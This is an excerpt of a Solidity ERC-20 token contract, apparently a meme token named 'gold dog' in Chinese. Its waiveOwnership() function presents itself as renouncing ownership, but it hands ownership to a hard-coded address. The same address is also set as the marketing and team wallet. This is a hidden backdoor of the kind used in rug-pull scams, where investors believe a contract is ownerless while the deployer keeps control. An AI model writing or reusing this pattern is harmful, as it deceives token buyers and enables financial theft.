...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xd9527c88c2766B77eAc3c1B6F9cbDab3703Ee8E6));
        _owner = address(0xd9527c88c2766B77eAc3c1B6F9cbDab3703Ee8E6);
    }
...
contract  z  is Context, IERC20, Ownable {
    ...
    string private _name = "\u91d1\u72d7" ;
    string private _symbol = "\u91d1\u72d7";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xd9527c88c2766B77eAc3c1B6F9cbDab3703Ee8E6);
    address payable public teamWalletAddress = payable(0xd9527c88c2766B77eAc3c1B6F9cbDab3703Ee8E6);
